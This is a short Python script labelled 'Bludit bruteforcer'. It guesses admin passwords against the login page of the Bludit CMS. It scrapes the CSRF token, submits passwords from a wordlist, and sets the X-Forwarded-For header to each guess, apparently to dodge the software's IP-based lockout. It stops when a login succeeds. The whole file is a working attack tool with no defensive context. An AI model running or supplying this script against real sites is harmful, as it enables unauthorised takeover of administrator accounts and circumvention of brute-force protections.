import requests
import re
import argparse

parser = argparse.ArgumentParser(description='Bludit bruteforcer')
parser.add_argument('-u', dest='url', type=str, required=True, help='Target')
parser.add_argument('-user', dest='user', type=str,required=True, help='Username')
parser.add_argument('-w', dest='wordlist', type=str, required=True, help='Wordlist' )
args=parser.parse_args()

URL=args.url+'/admin/login'
s = requests.Session()
passw=open(args.wordlist,'r')
r=s.get(URL)
csrf_token=re.search('input.+?name="tokenCSRF".+?value="(.+?)"', r.text).group(1)

for i in passw:
    data = {
            'tokenCSRF': csrf_token,
            'username' : args.user,
            'password' : i.strip(),
            'save' : '',
    }
    headers = {
            'X-Forwarded-For': i.strip(),
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': URL,
    }
    res=s.post(URL,data=data,headers=headers)
    if "password incorrect" in res.text:
        print(args.user+" : "+i.strip())
        csrf_token=re.search('input.+?name="tokenCSRF".+?value="(.+?)"', res.text).group(1)

    else:
        print(args.user+" : "+i.strip()+"  ==>found")
        exit()
